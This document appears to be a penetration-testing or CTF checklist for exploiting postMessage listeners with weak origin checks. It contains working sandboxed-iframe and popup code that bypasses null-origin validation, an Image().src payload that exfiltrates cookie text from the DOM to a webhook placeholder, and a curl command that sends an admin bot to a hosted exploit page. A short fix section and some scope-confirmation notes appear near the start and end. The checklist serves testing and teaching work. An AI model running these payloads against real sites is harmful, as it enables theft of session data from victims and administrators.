# postMessage Null-Origin Recon Checklist

## Goal

Find a `postMessage` listener with weak origin validation, bypass it with sandboxed `null` origins if applicable, and exfiltrate the minimum proof from the victim page or admin bot.

## 1. Scope Confirmation

- Confirm lab, owned app, in-scope target, or defensive review.
- Record host and date.
- Do not copy live flags, cookies, tokens, or private webhook URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
```

## 2. Find Message Listeners

Search page source, bundled JS, and runtime listeners for:

```text
onmessage
addEventListener('message'
addEventListener("message"
postMessage(
```

Record:

```text
Listener location:
Origin check:
Dangerous sink:
```

## 3. Classify The Origin Check

Check whether the code uses:

```text
event.origin !== location.origin      # safer
event.origin !== window.origin        # likely vulnerable
event.origin.includes('example.com')  # weak
event.origin == allowedOrigin         # depends on allowlist strength
event.source == someWindow            # separate class of bug
```

If `window.origin` is involved, prioritize sandbox null-origin testing.

## 4. Classify The Sink

Record what happens to `event.data`:

```text
eval(...)
innerHTML = ...
location = ...
setTimeout(event.data, ...)
function lookup / template render / JSON parse only
```

No dangerous sink means impact may be limited to data leakage paths.

## 5. Identify Secret Location

Do not assume `document.cookie`.

Check for:

```text
document.cookie
DOM elements such as #cookies, #session, #token
server-rendered text in the HTML
admin-only fetch endpoints
window.name / localStorage / sessionStorage
```

Quick server-side reflection test:

```bash
curl -sS "https://[host]/" -H "Cookie: FLAG=test" | rg 'cookies|FLAG|session'
```

Record:

```text
Secret location:
Readable from JS after bypass: yes/no
```

## 6. Test Null-Origin Bypass Locally

### Nested sandbox iframe pattern

```html
<script>
const outer = document.createElement('iframe');
outer.sandbox = 'allow-scripts';
outer.srcdoc = `
<script>
  const f = document.createElement('iframe');
  f.sandbox = 'allow-scripts';
  f.src = 'https://[host]/';
  (document.body || document.documentElement).appendChild(f);
  setTimeout(() => {
    f.contentWindow.postMessage('PAYLOAD', '*');
  }, 10000);
</script>`;
document.body.appendChild(outer);
</script>
```

### Sandbox popup pattern

```html
<script>
const outer = document.createElement('iframe');
outer.sandbox = 'allow-scripts allow-popups allow-modals allow-top-navigation';
outer.srcdoc = `
<script>
  const w = open('https://[host]/');
  setTimeout(() => w.postMessage('PAYLOAD', '*'), 10000);
</script>`;
document.body.appendChild(outer);
</script>
```

Record:

```text
Bypass works: yes/no
Popup required for privileged data: yes/no
Delay required: [seconds]
```

## 7. Build Minimal Payload

Start with a visible proof:

```javascript
document.getElementById('output').textContent = 'pwn'
```

Then move to exfil:

```javascript
(new Image()).src='https://[webhook]?c=' + encodeURIComponent(document.getElementById('cookies').innerText)
```

Prefer `Image().src` over `fetch()` if sandbox/CORS causes failures.

## 8. Choose Exploit Hosting

Avoid webhook.site for hosting executable exploit HTML if CSP blocks scripts.

Prefer:

```text
data: URL
self-hosted server / tunnel
paste service that serves raw HTML without script CSP
```

Record:

```text
Exploit host:
CSP blocks scripts: yes/no
```

## 9. Trigger Admin/Support Bot

Look for endpoints such as:

```text
/report
/api/report
/send
/review
```

```bash
curl -sS -X POST "https://[host]/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[exploit-host]/exploit.html"}'
```

Record:

```text
Bot endpoint:
External URLs accepted: yes/no
Observed visit: yes/no
```

## 10. Timing

If the exploit uses `setTimeout`, ensure:

```text
Bot stays on page long enough
Delay matches or exceeds payload timeout
Multiple reports are not racing stale hosts
```

For this lab pattern, 10 seconds was required.

## 11. Confirm Root Cause

Separate:

```text
Weak origin check:
Dangerous sink:
Secret exposure location:
Bot visit path:
```

## 12. Fix Checklist

- Use `location.origin` or a strict allowlist.
- Remove `eval` and HTML sinks from message handlers.
- Do not render secrets into the DOM.
- Use HttpOnly cookies.
- Isolate admin/report bots from attacker-controlled pages.

## 13. Decision Checklist

- [ ] Message listener identified.
- [ ] Origin check classified.
- [ ] Sink classified.
- [ ] Secret location identified.
- [ ] Null-origin bypass confirmed.
- [ ] Exfil payload works.
- [ ] Exploit hosted on script-friendly origin.
- [ ] Admin bot triggered successfully.
- [ ] Minimal proof captured.
- [ ] Reusable notes exclude live secrets.
